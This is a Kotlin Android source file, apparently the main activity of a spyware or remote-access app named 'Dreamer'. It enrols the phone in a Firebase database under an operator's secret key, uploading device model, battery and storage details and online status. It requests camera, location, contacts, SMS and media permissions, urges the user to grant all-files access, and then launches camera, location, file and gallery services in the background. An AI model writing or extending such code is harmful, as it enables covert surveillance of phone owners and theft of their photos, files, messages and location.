package com.h4k3r.dreamer

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.security.MessageDigest

class MainActivity : ComponentActivity() {

    /* ── Device ID Generation ─────────────────────── */
    private fun deviceId(): String {
        val androidId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        return MessageDigest.getInstance("SHA-256")
            .digest(androidId.toByteArray())
            .take(6)
            .joinToString("") { "%02x".format(it) }
    }

    /* ── Secret Key from Assets ─────────────────── */
    private fun getSecretKey(): String? {
        return try {
            assets.open("secret_key.txt")
                .bufferedReader()
                .readLine()
                ?.trim()
                ?.takeIf { it.isNotEmpty() }
        } catch (e: Exception) {
            null
        }
    }

    /* ── Runtime Permissions ────────────────────── */
    private val corePerms = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS
    )

    private val mediaPerms = if (Build.VERSION.SDK_INT >= 33) {
        arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO
        )
    } else {
        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        afterPermissionCheck()
    }

    /* ── Lifecycle ──────────────────────────────── */
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Get secret key
        val secretKey = getSecretKey()
        if (secretKey == null) {
            Toast.makeText(
                this,
                "⚠️ Configuration Error: Missing secret_key.txt in assets folder",
                Toast.LENGTH_LONG
            ).show()
            finish()
            return
        }

        // Get device ID
        val deviceId = deviceId()

        // Store key and device ID in shared preferences for services
        getSharedPreferences("dreamer_auth", MODE_PRIVATE).edit().apply {
            putString("secret_key", secretKey)
            putString("device_id", deviceId)
            apply()
        }

        // Register device info in Firebase
        registerDevice(secretKey, deviceId)

        // Request permissions
        permLauncher.launch(corePerms + mediaPerms)

        // Try to start services immediately
        afterPermissionCheck()

        // Show success message
        Toast.makeText(
            this,
            "✅ Dreamer App Initialized\nDevice ID: ${deviceId.take(6)}...",
            Toast.LENGTH_LONG
        ).show()
    }

    /* ── Firebase Registration ──────────────────── */
    private fun registerDevice(key: String, deviceId: String) {
        val deviceInfo = mapOf(
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "android" to Build.VERSION.SDK_INT,
            "sdk_name" to Build.VERSION.RELEASE,
            "time" to System.currentTimeMillis(),
            "app_version" to "1.0.0",
            "battery" to getBatteryLevel(),
            "storage" to getStorageInfo()
        )

        Firebase.database.reference
            .child("devices")
            .child(key)
            .child(deviceId)
            .child("info")
            .setValue(deviceInfo)
            .addOnSuccessListener {
                updateDeviceStatus(key, deviceId, true)
            }
    }

    /* ── Update Online Status ───────────────────── */
    private fun updateDeviceStatus(key: String, deviceId: String, online: Boolean) {
        Firebase.database.reference
            .child("devices")
            .child(key)
            .child(deviceId)
            .child("status")
            .setValue(
                mapOf(
                    "online" to online,
                    "lastSeen" to System.currentTimeMillis()
                )
            )
    }

    /* ── Helper Methods ─────────────────────────── */
    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(
            null,
            android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
        val level = batteryIntent?.getIntExtra("level", -1) ?: -1
        val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
        return if (level != -1 && scale != -1) {
            (level * 100 / scale)
        } else {
            -1
        }
    }

    private fun getStorageInfo(): Map<String, Long> {
        val stat = android.os.StatFs(Environment.getExternalStorageDirectory().path)
        val blockSize = stat.blockSizeLong
        val totalBlocks = stat.blockCountLong
        val availableBlocks = stat.availableBlocksLong

        return mapOf(
            "total" to totalBlocks * blockSize,
            "available" to availableBlocks * blockSize
        )
    }

    /* ── Service Starter ────────────────────────── */
    private fun afterPermissionCheck() {
        fun hasPerm(p: String): Boolean =
            PermissionChecker.checkSelfPermission(this, p) ==
                    PermissionChecker.PERMISSION_GRANTED

        // Start each service if its permissions are granted
        if (hasPerm(Manifest.permission.CAMERA)) {
            startServiceWithAuth(CameraService::class.java)
        }

        if (hasPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
            startServiceWithAuth(DataService::class.java)
        }

        if (mediaPerms.any { hasPerm(it) }) {
            startServiceWithAuth(FilesService::class.java)
            startServiceWithAuth(GalleryService::class.java)
        }

        // For Android 11+, suggest All Files Access
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(
                Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    .setData(Uri.parse("package:$packageName"))
            )
            Toast.makeText(
                this,
                "📁 Please enable 'All files access' for full file management",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun startServiceWithAuth(serviceClass: Class<*>) {
        val intent = Intent(this, serviceClass)
        ContextCompat.startForegroundService(this, intent)
    }

    /* ── Cleanup on Destroy ─────────────────────── */
    override fun onDestroy() {
        // Update offline status
        getSharedPreferences("dreamer_auth", MODE_PRIVATE).apply {
            val key = getString("secret_key", null)
            val deviceId = getString("device_id", null)
            if (key != null && deviceId != null) {
                updateDeviceStatus(key, deviceId, false)
            }
        }
        super.onDestroy()
    }
}